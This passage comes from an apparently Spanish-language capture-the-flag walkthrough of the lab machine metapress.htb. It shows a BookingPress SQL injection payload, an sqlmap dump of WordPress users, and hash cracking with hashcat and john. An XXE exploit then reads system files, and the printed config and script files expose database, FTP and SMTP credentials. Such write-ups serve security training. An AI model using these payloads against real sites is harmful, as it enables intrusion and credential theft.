        <code class="command">curl -i --trace-ascii - 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
        </code>
        <details>
            <pre>
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 02 Mar 2023 21:32:39 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
            </pre>
        </details>
        <ul>
            <li>-i: Incluye el header de la respuesta en el output</li>
            <li>-: Indica la url</li>
            <li>--data: Información del body</li>
        </ul>
        <p>El output nos confirmanda que la pagina es efectivamente vulnerable</p>

        <p>Para obtener informacion de la base de datos utilizaremos sqlmap. Si ejecutamos el comando . Para no printar
            todo de golpe iremos
            mirando el nombre de la base de datos y tablas disponibles con los flags --dbs y --tables. El comando final
            a ejecutar una vez sabemos estos nombres será:</p>
        <code class="command">sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data="action=bookingpress_front_get_category_services&_wpnonce=7ea553b73c&category_id=33&total_service=1" -p total_service -D blog -T wp_users --dump
        </code>
        <details>
            <pre>
    ___
    __H__
___ ___[.]_____ ___ ___  {1.6.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
    |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:51:06 /2023-03-02/

[23:51:06] [INFO] resuming back-end DBMS 'mysql' 
[23:51:06] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=12a648bd01&category_id=33&total_service=1) AND (SELECT 1860 FROM (SELECT(SLEEP(5)))CTmy) AND (2868=2868

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=12a648bd01&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a6a7071,0x5557584476554c6e624877535241497974744d58426b4e4d4466634b7477526141736871526d4b42,0x717a627171),NULL-- -
---
[23:51:06] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[23:51:06] [INFO] fetching columns for table 'wp_users' in database 'blog'
[23:51:06] [INFO] fetching entries for table 'wp_users' in database 'blog'
[23:51:06] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 |                     |
| 2  |                      | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 |                     |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

[23:51:18] [INFO] table 'blog.wp_users' dumped to CSV file '/home/pah/.local/share/sqlmap/output/metapress.htb/dump/blog/wp_users.csv'
[23:51:18] [INFO] fetched data logged to text files under '/home/pah/.local/share/sqlmap/output/metapress.htb'
[23:51:18] [WARNING] your sqlmap version is outdated

[*] ending @ 23:51:18 /2023-03-02/
            </pre>
        </details>
        <ul>
            <li>-u: Indica la url a examinar</li>
            <li>data="DATA": Indicamos los datos de la peticion (body)</li>
            <li>-p: Indicamos el parametro a comprobar</li>
            <li>-D: Indica la base de datos donde queremos explorar</li>
            <li>-T: Indica la tabla que queremos explorar</li>
            <li>--dumpp: Indica que nos retorne toda la informacion disponible</li>
        </ul>
        <p>Las contraseñas extraidas estan hasheadas con phpass por lo que tendremos que crackearlas. Para ello
            utilizaremos el siguiente comando:</p>
        <code class="command">hashcat -O -m 400 -a 0 hashes rockyou.txt</code>
        <ul>
            <li>-O: Opcion para optimizar</li>
            <li>-m 400: Indicamos el tipo de hash que queremos crackear</li>
            <li>-a 0: Modo de ataque. 0 para diccionario en nuestro caso</li>
            <li>hashes: Lista de hashes a crackear</li>
            <li>rockyou.txt: Diccionario a utilizar</li>
        </ul>
        <p>En el siguiente <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">enlace</a> podemos encontrar
            una lista de referencia bastante útil a la hora de comprobar con que
            hash estamos trabajando.</p>
        <p>Pasado un rato vemos que hemos tenido exito en uno de los hashes pero no en el otro. El resultado es:
            $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar </p>
        <p>Con esto ya podriamos logearnos en la plataforma web y tener acceso a alguna de las otras vulnerabilidades
            que requerian autenticacion. Utilizaremos la vulnerabilidad "WordPress 5.6-5.7 - Authenticated XXE Within
            the Media Library Affecting PHP 8" la cual tiene varios exploits disponibles en internet.
        <p>Esta vulnerabilidad se basa en que como podemos subir archivos a la plataforma web podemos enviar un archivo
            wav malidioso para ver archivos del sistema.
            El <a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">PoC</a> es el siguiente
            aunque utilizaremos un <a href="https://github.com/b-abderrahmane/CVE-2021-29447-POC">exploit</a> de github
            para facilitarnos la
            vida.
        </p>
        <P>Si ejecutamos el exploit con la ruta de test /etc/passwd obtenemos el siguiente resultado confirmando que
            funciona.</P>
        <details>
            <pre>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
            </pre>
        </details>
        <p>Para continuar con la explotación tenemos que hacer una pausa para hacer un poco de reconocimiento con lo que
            tenemos hasta ahora. Nuestro siguiente paso sería intentar conseguir mas información sobre el servidor. Un
            buen sitio donde podemos encontrar cosas es en el archivo wp-config.php pero necesitamos saber su ruta
            completa para poder utilizar el exploit. Para ello podemos intentar mirar en el archivo
            /etc/nginx/sites-available/default.</p>
        <details>
            <pre>
server {

    listen 80;
    listen [::]:80;

    root /var/www/metapress.htb/blog;

    index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

    location / {
        try_files $uri $uri/ /index.php?$args;
    }
    
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
    }

    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
        expires max;
        log_not_found off;
    }

}     
            </pre>
        </details>
        <p>Una vez obtenida la ruta de la web podemos mirar el archivo wp-config.php.</p>
        <details>
            <pre>
&lt;?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

            </pre>
        </details>
        <p>De aqui ya tenemos acceso al servidor ftp donde podremos investigar los archivos de la aplicacion web.</p>
        <p>De estos hay un archivo en particular, send_email.php el cual contiene informacion que nos permitirá acceder
            a la cuenta de uno de los usuarios del servidor.</p>
        <details>
            <pre>
&lt;?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "&lt;i&gtWe just started our new blog metapress.htb!&lt;/i&gt;";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}

            </pre>
        </details>
        <p>Con esto ya tendriamos acceso de usuario al servidor. A continuación veremos como podemos convertirnos en
            root.</p>
        <h2>Escalación de privilegios:</h2>
        <p>En comparacion a lo anterior la escalacion de privilegios es muy directa. Invesitgando un poco por los
            directorios encontramos dos archivos encriptados con PGP y las claves para desencriptarlos, lo unico que nos
            hace falta es saber la contraseña para el archivo de la clave privada el cual crackearemos con <a
                href="https://github.com/openwall/john">john</a>.</p>
        <code class="command">gpg2john pass-to-crack.txt > john-format</code>
        <br>
        <code class="command">john --wordlist=rockyou.txt john-format </code>
        <p>El primer comando es para transformar la clave privada que hemos encontrado a un formato que john entienda.
            El segundo comando nos retornará la contraseña del archivo.</p>
        <p>Una vez tenemos la contraseña utilizando un desencriiptador online de pgp como <a
                href="https://8gwifi.org/pgpencdec.jsp">este</a> seía suficiente. Solo tenemos que introducir la
            infomraicon de la que ya disponemos y obtener la contraseña de root.</p>
    </article>
</body>

</html>